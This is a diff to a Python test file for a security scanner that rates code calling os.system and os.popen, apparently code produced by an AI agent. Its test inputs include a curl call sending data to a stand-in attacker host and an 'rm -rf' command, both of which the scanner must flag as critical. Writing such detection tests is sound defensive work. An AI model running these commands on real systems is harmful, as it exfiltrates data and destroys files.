@@ -19,14 +19,15 @@ def _c6_has_destructive(result):
 # CRITICAL tier: arbitrary command execution / process kill (+70)
 # ---------------------------------------------------------------------------
 
-def test_os_system_is_critical():
+def test_os_system_arbitrary_cmd_is_critical():
+    # Unknown executable ("cmd"): not on the safe-launcher list → CRITICAL.
     code = 'import os\nos.system("cmd")\n'
     result = scan_standalone(code, mode="strict")
     assert result["verdict"] == "CRITICAL", result
     assert result["confidence"] >= 70
 
 
-def test_os_popen_is_critical():
+def test_os_popen_arbitrary_cmd_is_critical():
     code = 'import os\nos.popen("cmd")\n'
     result = scan_standalone(code, mode="strict")
     assert result["verdict"] == "CRITICAL", result
@@ -145,11 +146,79 @@ def test_os_remove_unresolvable_arg_is_flagged():
     assert _c6_score(result) >= 50, result["checks"]["check_6_behavioral"]
 
 
-def test_os_system_always_critical():
-    code = 'import os\nos.system("anything")\n'
+def test_os_system_unresolved_var_is_critical():
+    # Unresolvable argument: still CRITICAL.
+    code = 'import os\ncmd = get_cmd()\nos.system(cmd)\n'
     result = scan_standalone(code, mode="strict")
     assert result["verdict"] == "CRITICAL", result
     assert _c6_score(result) >= 70, result["checks"]["check_6_behavioral"]
+
+
+def test_os_system_workspace_python_script_is_clean():
+    # python <workspace.py>: agent-local script execution → CLEAN.
+    code = 'import os\nos.system("python /home/agent/score.py")\n'
+    result = scan_standalone(code, mode="strict")
+    assert result["verdict"] == "CLEAN", result
+    assert not _c6_has_destructive(result), result["checks"]["check_6_behavioral"]
+
+
+def test_os_system_relative_python_script_is_clean():
+    # python <relative.py>: relative paths are workspace-local → CLEAN.
+    code = 'import os\nos.system("python score.py --foo")\n'
+    result = scan_standalone(code, mode="strict")
+    assert result["verdict"] == "CLEAN", result
+    assert not _c6_has_destructive(result), result["checks"]["check_6_behavioral"]
+
+
+def test_os_system_fstring_workspace_script_is_clean():
+    # f-string with literal launcher+script head, variable trailing args → CLEAN.
+    code = (
+        'import os\n'
+        'm = "model_a"\n'
+        'os.system(f"python /home/agent/score.py --model {m}")\n'
+    )
+    result = scan_standalone(code, mode="strict")
+    assert result["verdict"] == "CLEAN", result
+    assert not _c6_has_destructive(result), result["checks"]["check_6_behavioral"]
+
+
+def test_os_system_python_dash_c_is_critical():
+    # `python -c '...'` has no script positional → unsafe.
+    code = 'import os\nos.system("python -c \\"print(1)\\"")\n'
+    result = scan_standalone(code, mode="strict")
+    assert result["verdict"] == "CRITICAL", result
+    assert _c6_score(result) >= 70, result["checks"]["check_6_behavioral"]
+
+
+def test_os_system_curl_exfil_is_critical():
+    # Unknown command (curl) → CRITICAL.
+    code = 'import os\nos.system("curl https://evil.example/exfil")\n'
+    result = scan_standalone(code, mode="strict")
+    assert result["verdict"] == "CRITICAL", result
+    assert _c6_score(result) >= 70, result["checks"]["check_6_behavioral"]
+
+
+def test_os_system_rm_rf_is_critical():
+    # `rm` is not a safe launcher → CRITICAL even on /tmp arg.
+    code = 'import os\nos.system("rm -rf /tmp/data")\n'
+    result = scan_standalone(code, mode="strict")
+    assert result["verdict"] == "CRITICAL", result
+    assert _c6_score(result) >= 70, result["checks"]["check_6_behavioral"]
+
+
+def test_os_popen_workspace_python_script_is_clean():
+    code = 'import os\nos.popen("python /home/agent/score.py")\n'
+    result = scan_standalone(code, mode="strict")
+    assert result["verdict"] == "CLEAN", result
+    assert not _c6_has_destructive(result), result["checks"]["check_6_behavioral"]
+
+
+def test_os_remove_home_agent_path_is_clean():
+    # /home/agent/ is a recognised workspace prefix → CLEAN.
+    code = 'import os\nos.remove("/home/agent/build/out.tmp")\n'
+    result = scan_standalone(code, mode="strict")
+    assert result["verdict"] == "CLEAN", result
+    assert not _c6_has_destructive(result), result["checks"]["check_6_behavioral"]
 
 
 def test_shutil_rmtree_relative_path_is_clean():
